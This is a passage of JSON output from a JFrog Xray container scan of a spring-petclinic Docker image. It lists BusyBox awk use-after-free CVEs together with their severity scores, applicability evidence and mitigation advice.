                  "details": "Evidence: awk, Line Number: 4605, Issue Found: Busybox executable with awk applet was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "vulnerability_id": "CVE-2021-42382",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-190227",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the evaluate function",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:ssl_client",
         "source_id": "alpine://3.14:ssl_client",
         "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
         "component_versions": {
            "id": "3.14:ssl_client",
            "vulnerable_versions": [
               "< 1.33.1-r6"
            ],
            "fixed_versions": [
               "1.33.1-r6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-42383",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "6.5/CVSS:2.0/AV:N/AC:L/Au:S/C:P/I:P/A:P",
                     "cvss_v3": "7.2/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the evaluate function",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190227",
            "VulnerabilityTitle": "",
            "ShortDescription": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `evaluate` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog blogpost",
                  "Url": "https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "cve_id": "CVE-2021-42383",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/bin/busybox",
                        "awk",
                        "3661",
                        "Busybox executable with awk applet was found"
                     ],
                     [
                        "/bin/busybox",
                        "awk",
                        "4605",
                        "Busybox executable with awk applet was found"
                     ]
                  ]
               },
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ]
                  ]
               }
            ],
            "info": "Vulnerable references to Busybox awk were {not }found in the filesystem",
            "details": [
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 3661, Issue Found: Busybox executable with awk applet was found"
               },
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 4605, Issue Found: Busybox executable with awk applet was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "vulnerability_id": "CVE-2021-42383",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-190227",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the evaluate function",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:busybox",
         "source_id": "alpine://3.14:busybox",
         "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
         "component_versions": {
            "id": "3.14:busybox",
            "vulnerable_versions": [
               "< 1.33.1-r6"
            ],
            "fixed_versions": [
               "1.33.1-r6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-42383",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "6.5/CVSS:2.0/AV:N/AC:L/Au:S/C:P/I:P/A:P",
                     "cvss_v3": "7.2/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the evaluate function",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190227",
            "VulnerabilityTitle": "",
            "ShortDescription": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `evaluate` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog blogpost",
                  "Url": "https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "cve_id": "CVE-2021-42383",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/bin/busybox",
                        "awk",
                        "3661",
                        "Busybox executable with awk applet was found"
                     ],
                     [
                        "/bin/busybox",
                        "awk",
                        "4605",
                        "Busybox executable with awk applet was found"
                     ]
                  ]
               },
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ]
                  ]
               }
            ],
            "info": "Vulnerable references to Busybox awk were {not }found in the filesystem",
            "details": [
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 3661, Issue Found: Busybox executable with awk applet was found"
               },
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 4605, Issue Found: Busybox executable with awk applet was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "vulnerability_id": "CVE-2021-42383",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-190226",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the handle_special function",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:busybox",
         "source_id": "alpine://3.14:busybox",
         "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
         "component_versions": {
            "id": "3.14:busybox",
            "vulnerable_versions": [
               "< 1.33.1-r6"
            ],
            "fixed_versions": [
               "1.33.1-r6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-42384",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "6.5/CVSS:2.0/AV:N/AC:L/Au:S/C:P/I:P/A:P",
                     "cvss_v3": "7.2/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the handle_special function",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190226",
            "VulnerabilityTitle": "",
            "ShortDescription": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `handle_special` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog blogpost",
                  "Url": "https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "cve_id": "CVE-2021-42384",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/bin/busybox",
                        "awk",
                        "3661",
                        "Busybox executable with awk applet was found"
                     ],
                     [
                        "/bin/busybox",
                        "awk",
                        "4605",
                        "Busybox executable with awk applet was found"
                     ]
                  ]
               },
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ]
                  ]
               }
            ],
            "info": "Vulnerable references to Busybox awk were {not }found in the filesystem",
            "details": [
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 3661, Issue Found: Busybox executable with awk applet was found"
               },
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 4605, Issue Found: Busybox executable with awk applet was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "vulnerability_id": "CVE-2021-42384",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-190226",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the handle_special function",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:ssl_client",
         "source_id": "alpine://3.14:ssl_client",
         "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
         "component_versions": {
            "id": "3.14:ssl_client",
            "vulnerable_versions": [
               "< 1.33.1-r6"
            ],
            "fixed_versions": [
               "1.33.1-r6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-42384",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "6.5/CVSS:2.0/AV:N/AC:L/Au:S/C:P/I:P/A:P",
                     "cvss_v3": "7.2/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the handle_special function",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190226",
            "VulnerabilityTitle": "",
            "ShortDescription": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `handle_special` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog blogpost",
                  "Url": "https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "cve_id": "CVE-2021-42384",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/bin/busybox",
                        "awk",
                        "3661",
                        "Busybox executable with awk applet was found"
                     ],
                     [
                        "/bin/busybox",
                        "awk",
                        "4605",
                        "Busybox executable with awk applet was found"
                     ]
                  ]
               },
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ]
                  ]
               }
            ],
            "info": "Vulnerable references to Busybox awk were {not }found in the filesystem",
            "details": [
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 3661, Issue Found: Busybox executable with awk applet was found"
               },
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 4605, Issue Found: Busybox executable with awk applet was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "vulnerability_id": "CVE-2021-42384",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-190219",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the evaluate function",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:ssl_client",
         "source_id": "alpine://3.14:ssl_client",
         "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
         "component_versions": {
            "id": "3.14:ssl_client",
            "vulnerable_versions": [
               "< 1.33.1-r6"
            ],
            "fixed_versions": [
               "1.33.1-r6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-42385",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "6.5/CVSS:2.0/AV:N/AC:L/Au:S/C:P/I:P/A:P",
                     "cvss_v3": "7.2/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the evaluate function",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190219",
            "VulnerabilityTitle": "",
            "ShortDescription": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `evaluate` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog blogpost",
                  "Url": "https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "cve_id": "CVE-2021-42385",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/bin/busybox",
                        "awk",
                        "3661",
                        "Busybox executable with awk applet was found"
                     ],
                     [
                        "/bin/busybox",
                        "awk",
                        "4605",
                        "Busybox executable with awk applet was found"
